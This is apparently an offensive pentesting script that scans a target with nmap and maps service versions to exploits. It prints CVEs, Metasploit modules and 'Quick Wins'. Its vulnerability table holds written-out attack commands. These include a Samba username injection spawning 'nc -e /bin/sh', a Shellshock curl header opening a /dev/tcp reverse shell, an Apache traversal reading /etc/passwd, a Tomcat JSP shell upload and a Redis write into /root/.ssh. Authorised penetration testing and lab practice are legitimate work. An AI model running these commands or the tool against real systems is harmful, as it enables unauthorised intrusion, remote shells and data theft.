```python
#!/usr/bin/env python3
"""
vuln_scan.py - Service version to exploit mapper
Usage: python3 vuln_scan.py --xml nmap_out.xml
"""

import argparse
import subprocess
import sys
import re
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from typing import Optional

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

def info(s): print(f"{C}[*]{X} {s}")
def good(s): print(f"{G}[+]{X} {s}")
def warn(s): print(f"{Y}[!]{X} {s}")
def bad(s): print(f"{R}[-]{X} {s}")
def head(s): print(f"\n{B}{C}{'-'*60}{X}\n{B}  {s}{X}\n{'-'*60}")

VULN_DB = [
    ("vsftpd", r"2\.3\.4", "CVE-2011-2523", "vsftpd 2.3.4 backdoor",
     "exploit/unix/ftp/vsftpd_234_backdoor", "nc target 6200"),
    ("proftpd", r"1\.3\.3", "CVE-2010-4221", "ProFTPD 1.3.3 mod_copy RCE",
     "exploit/unix/ftp/proftpd_133c_backdoor", "SITE CPFR / SITE CPTO"),
    ("openssh", r"7\.[0-6]", "CVE-2018-15473", "OpenSSH username enumeration",
     None, "Different timing/response for valid vs invalid users"),
    ("samba", r"[23]\.[0-4]", "MS17-010", "EternalBlue SMB RCE",
     "exploit/windows/smb/ms17_010_eternalblue", "python3 eternalblue_exploit.py target"),
    ("samba", r"3\.[0-5]", "CVE-2007-2447", "Samba 3.0.x usermap_script RCE",
     "exploit/multi/samba/usermap_script", "smbclient -U './=`nohup nc -e /bin/sh IP PORT`' //target/tmp"),
    ("samba", r"4\.[0-8]", "CVE-2017-7494", "SambaCry pipe RCE",
     "exploit/linux/samba/is_known_pipename", "Requires writable share + .so payload upload"),
    ("apache", r"2\.4\.4[89]", "CVE-2021-41773", "Apache 2.4.49 path traversal/RCE",
     None, "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'"),
    ("iis", r"[56]\.", "CVE-2017-7269", "IIS 6.0 WebDAV ScStoragePathFromUrl",
     "exploit/windows/iis/iis_webdav_scstoragepathfromurl", "Buffer overflow in WebDAV"),
    ("tomcat", r"[456789]\.", "CVE-2017-12617", "Tomcat PUT JSP upload",
     None, "curl -X PUT 'http://target/shell.jsp/' --data @shell.jsp"),
    ("tomcat", r".*", None, "Tomcat Manager default creds check",
     "exploit/multi/http/tomcat_mgr_upload", "Try admin:admin tomcat:tomcat at /manager/html"),
    ("mysql", r"[345]\.", "CVE-2012-2122", "MySQL auth bypass memcmp timing",
     None, "for i in $(seq 1 1000); do mysql -u root --password=x -h target; done"),
    ("postgresql", r"[89]\.|1[012]\.", "CVE-2019-9193", "PostgreSQL COPY PROGRAM RCE",
     None, "COPY cmd_exec FROM PROGRAM 'id'; — needs superuser"),
    ("distccd", r".*", "CVE-2004-2687", "distccd arbitrary command exec",
     "exploit/unix/misc/distcc_exec", "Port 3632 — trivial RCE"),
    ("unrealircd", r"3\.2\.8", "CVE-2010-2075", "UnrealIRCd backdoor",
     "exploit/unix/irc/unreal_ircd_3281_backdoor", "AB; payload on port 6667"),
    ("redis", r".*", None, "Redis unauth — write SSH key or cron",
     None, "redis-cli -h target; CONFIG SET dir /root/.ssh; SET x 'pubkey'; SAVE"),
    ("nfs", r".*", None, "NFS no_root_squash check",
     None, "showmount -e target; check /etc/exports for no_root_squash"),
    ("snmp", r".*", None, "SNMP community string bruteforce",
     None, "onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt target"),
    ("exim", r"4\.[89][0-6]", "CVE-2019-10149", "Exim RCE Return of the WIZard",
     None, "Requires local delivery — exim --version to confirm"),
    ("bash", r"[12345]\.", "CVE-2014-6271", "Shellshock CGI RCE",
     "exploit/multi/http/apache_mod_cgi_bash_env_exec", "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' http://target/cgi-bin/test.cgi"),
    ("openssl", r"1\.0\.[01]", "CVE-2014-0160", "Heartbleed memory leak",
     None, "python3 heartbleed.py target"),
    ("sendmail", r".*", None, "Sendmail VRFY user enumeration",
     None, "nc target 25 -> VRFY root"),
    ("x11", r".*", None, "X11 open display — screenshot/keylog",
     None, "xspy -display target:0 or xwd -display target:0 -root -silent"),
]

@dataclass
class Service:
    port: int
    proto: str
    state: str
    name: str
    product: str
    version: str
    extra: str

@dataclass
class Finding:
    service: Service
    cve: Optional[str]
    desc: str
    msf: Optional[str]
    manual: str
    severity: str

def parse_nmap_xml(xml_path):
    services = []
    try:
        root = ET.parse(xml_path).getroot()
        for port in root.findall(".//port"):
            state = port.find("state")
            if state is None or state.get("state") != "open":
                continue
            svc = port.find("service") or ET.Element("service")
            services.append(Service(
                port=int(port.get("portid", 0)),
                proto=port.get("protocol", "tcp"),
                state="open",
                name=svc.get("name", "unknown"),
                product=svc.get("product", ""),
                version=svc.get("version", ""),
                extra=svc.get("extrainfo", ""),
            ))
    except Exception as e:
        bad(f"Parse error: {e}")
    return services

def match_vulns(services):
    findings = []
    for svc in services:
        banner = f"{svc.name} {svc.product} {svc.version} {svc.extra}".lower()
        for svc_re, ver_re, cve, desc, msf, manual in VULN_DB:
            if re.search(svc_re, banner, re.IGNORECASE):
                ver_str = f"{svc.version} {svc.extra}".strip()
                if re.search(ver_re, ver_str, re.IGNORECASE) or ver_re == r".*":
                    sev = "HIGH" if cve and msf else ("MEDIUM" if cve else "INFO")
                    findings.append(Finding(svc, cve, desc, msf, manual, sev))
    return findings

SEV_C = {"HIGH": R, "MEDIUM": Y, "INFO": C}

def print_report(findings, services):
    head("Open Services")
    for s in services:
        ver = f"{s.product} {s.version}".strip()
        print(f"  {s.port:<6} {s.proto:<4} {s.name:<15} {ver}")

    head("Vulnerability Matches")
    if not findings:
        bad("No known vulns matched — check manually")
        return

    findings.sort(key=lambda f: {"HIGH": 0, "MEDIUM": 1, "INFO": 2}[f.severity])
    for f in findings:
        col = SEV_C[f.severity]
        print(f"\n  {col}{B}[{f.severity}]{X} Port {f.service.port} — {f.desc}")
        if f.cve:
            print(f"         CVE   : {f.cve}")
        if f.msf:
            print(f"         MSF   : use {f.msf}")
        print(f"         Manual: {f.manual}")

    head("Quick Wins (HIGH severity)")
    highs = [f for f in findings if f.severity == "HIGH"]
    if not highs:
        info("No HIGH findings — look for chains in MEDIUM/INFO results")
    for i, f in enumerate(highs, 1):
        print(f"  {i}. Port {f.service.port} — {f.desc}")
        print(f"     {'MSF: use ' + f.msf if f.msf else 'Manual: ' + f.manual}")

def main():
    ap = argparse.ArgumentParser(description="vuln_scan.py — version to exploit mapper")
    ap.add_argument("-t", "--target", default=None, help="Target IP")
    ap.add_argument("--xml", default=None, help="Parse existing nmap XML")
    ap.add_argument("--full-nmap", action="store_true", help="Run full -p- scan")
    ap.add_argument("--save-xml", default=None, help="Save nmap XML to path")
    args = ap.parse_args()

    if not args.target and not args.xml:
        ap.print_help()
        sys.exit(1)

    xml = args.xml
    if not xml:
        xml_out = args.save_xml or "/tmp/vuln_scan_nmap.xml"
        flags = ["-sV", "-sC", "-O", "-p-", "--open"] if args.full_nmap else ["-sV", "--version-intensity", "7", "--open", "-T4"]
        cmd = ["nmap"] + flags + ["-oX", xml_out, args.target]
        info(f"Running: {' '.join(cmd)}")
        try:
            subprocess.run(cmd, timeout=300, check=True)
            xml = xml_out
        except Exception as e:
            bad(f"nmap error: {e}")
            sys.exit(1)

    services = parse_nmap_xml(xml)
    if not services:
        bad("No open services found")
        sys.exit(1)

    print_report(match_vulns(services), services)

if __name__ == "__main__":
    main()
```